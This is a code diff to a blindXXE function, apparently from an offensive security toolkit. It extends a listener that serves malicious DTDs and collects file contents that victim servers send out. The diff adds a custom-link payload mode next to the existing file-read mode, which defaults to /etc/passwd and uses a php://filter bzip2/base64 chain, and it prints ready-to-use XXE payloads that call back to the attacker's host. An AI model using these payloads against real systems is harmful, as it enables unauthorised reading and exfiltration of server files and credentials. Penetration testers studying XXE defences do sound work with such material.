@@ -945,9 +945,11 @@ def blindXXE(host: str = "0.0.0.0", port: int = 2021, isasync: bool = False):
     It will generate payload and wait for receive file contents.
 
     Note:
-        the payload like http://{host}:{port}/evil.dtd?[file=filepath you want to read][&bz2].
-        argument file(optional) is the path of the file you want to read. Defaults to "/etc/passwd".
-        argument bz2(optional) is whether to use bz2 compress.
+        read file payload like http://{host}:{port}/evil.dtd?[file=filepath you want to read][&bz2]:
+            argument file(optional): the path of the file you want to read. Defaults to "/etc/passwd".
+            argument bz2(optional): whether to use bz2 compress.
+        custom payload like http://{host}:{port}/custom.dtd?link=[any custom link]
+            arugment link: The link protocol can be any protocol supported by the victim server, this server will try to decode the received content with bz2 and base64
 
     Args:
         host (str, optional): host that the victim can access. Defaults to "0.0.0.0".
@@ -958,14 +960,28 @@ def blindXXE(host: str = "0.0.0.0", port: int = 2021, isasync: bool = False):
 <!ENTITY % hack "<!ENTITY &#x25; go SYSTEM 'http://{host}:{port}/?%payload;'>">
 %hack;""".encode()
     bz2content = f"""<!ENTITY % payload SYSTEM "php://filter/bzip2.compress/convert.base64-encode/resource=!readFile!">
-<!ENTITY % hack "<!ENTITY &#x25; go SYSTEM 'http://{host}:{port}/bz2?%payload;'>">
+<!ENTITY % hack "<!ENTITY &#x25; go SYSTEM 'http://{host}:{port}/?%payload;'>">
 %hack;""".encode()
-    handler = partial(BlindXXEHandler, content, bz2content)
+    customcontent = f"""<!ENTITY % payload SYSTEM "!link!">
+<!ENTITY % hack "<!ENTITY &#x25; go SYSTEM 'http://{host}:{port}/?%payload;'>">
+%hack;""".encode()
+
+    handler = partial(BlindXXEHandler, content, bz2content, customcontent)
     server = HTTPServer(("0.0.0.0", port), handler)
-    print(f"Listen on 0.0.0.0:{port} ...")
-    print(f"""Payload is:\n\n<?xml version="1.0"?>
+    print(f"Listen on 0.0.0.0:{port} ...\n")
+    print(f"""Read file payload:<?xml version="1.0"?>
 <!DOCTYPE root [
 <!ENTITY % remote SYSTEM "http://{host}:{port}/evil.dtd?[file=filepath you want to read][&bz2]">
+%remote;
+%go;
+]>
+
+<root></root>
+
+Custom payload:
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://{host}:{port}/custom.dtd?link=[any custom link]">
 %remote;
 %go;
 ]>
